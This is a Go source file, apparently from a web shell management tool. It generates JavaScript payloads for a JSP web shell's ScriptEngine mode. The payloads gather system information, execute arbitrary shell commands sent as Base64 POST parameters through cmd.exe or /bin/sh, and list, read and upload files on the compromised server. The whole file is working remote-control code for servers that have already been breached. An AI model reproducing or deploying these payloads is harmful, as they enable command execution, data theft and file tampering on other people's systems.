package jsp

// ── JS templates for Dynamic (ScriptEngine) mode ──────────────
// Each is self-contained JavaScript code. The Shell provides:
//   out      - JspWriter for output
//   request  - HttpServletRequest
//   P1, P2   - POST parameter names for data
// JS code defines its own b64d/b64e inline.

func jsB64() string {
	return "var b64d=function(s){return new java.lang.String(java.util.Base64.getDecoder().decode(s),\"UTF-8\")};" +
		"var b64e=function(s){return java.util.Base64.getEncoder().encodeToString(s.getBytes(\"UTF-8\"))};"
}

// JSInfo returns JS code for Info in dynamic mode.
func (t *JSPTemplates) JSInfo() string {
	return jsB64() +
		"var wd=new java.io.File(\".\").getCanonicalPath();" +
		"var os=java.lang.System.getProperty(\"os.name\")+\" \"+java.lang.System.getProperty(\"os.version\");" +
		"var us=java.lang.System.getProperty(\"user.name\");" +
		"out.print(b64e(wd)+\"\\t\"+b64e(os)+\"\\t\"+b64e(us));"
}

// JSExec returns JS code for Exec in dynamic mode.
func (t *JSPTemplates) JSExec() string {
	return jsB64() +
		"var cmd=b64d(request.getParameter(P1));" +
		"var osName=java.lang.System.getProperty(\"os.name\").toLowerCase();" +
		"var execCmd;" +
		"if(osName.contains(\"win\")){execCmd=[\"cmd.exe\",\"/c\",cmd];}" +
		"else{execCmd=[\"/bin/sh\",\"-c\",cmd];}" +
		"var p=java.lang.Runtime.getRuntime().exec(execCmd);" +
		"var br=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream(),\"UTF-8\"));" +
		"var line;var first=true;" +
		"while((line=br.readLine())!==null){" +
		"if(first){out.print(line);first=false;}else{out.println();out.print(line);}" +
		"}" +
		"br.close();" +
		"var ec=p.waitFor();" +
		"out.print(\"ret=\"+ec);"
}

// JSFileList returns JS code for FileList in dynamic mode.
func (t *JSPTemplates) JSFileList() string {
	return jsB64() +
		"var path=b64d(request.getParameter(P1));" +
		"var dir=new java.io.File(path);" +
		"var files=dir.listFiles();" +
		"if(files!==null){" +
		"var sdf=new java.text.SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");" +
		"for(var i=0;i<files.length;i++){" +
		"var f=files[i];var fName=f.getName();" +
		"if(f.isDirectory())fName+=\"/\";" +
		"out.print(fName+\"\\t\");" +
		"out.print(sdf.format(new java.util.Date(f.lastModified()))+\"\\t\");" +
		"out.print(f.length()+\"\\t\");" +
		"out.print(f.isDirectory()?\"0755\":\"0644\");" +
		"out.println();" +
		"}" +
		"}"
}

// JSFileRead returns JS code for FileRead in dynamic mode.
func (t *JSPTemplates) JSFileRead() string {
	return jsB64() +
		"var path=b64d(request.getParameter(P1));" +
		"var fis=new java.io.FileInputStream(path);" +
		"var bos=new java.io.ByteArrayOutputStream();" +
		"var buf=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,8192);" +
		"var n;" +
		"while((n=fis.read(buf))!==-1)bos.write(buf,0,n);" +
		"fis.close();" +
		"var raw=new java.lang.String(bos.toByteArray(),\"ISO-8859-1\");" +
		"out.print(b64e(raw));"
}

// JSFileDownload returns JS code for FileDownload in dynamic mode.
func (t *JSPTemplates) JSFileDownload() string { return t.JSFileRead() }

// JSFileUpload returns JS code for FileUpload in dynamic mode.
func (t *JSPTemplates) JSFileUpload() string {
	return jsB64() +
		"var path=b64d(request.getParameter(P1));" +
		"var content=b64d(request.getParameter(P2));" +
		"var fos=new java.io.FileOutputStream(path);" +
		"fos.write(content.getBytes(\"ISO-8859-1\"));" +
		"fos.close();" +
		"out.print(\"1\");"
}
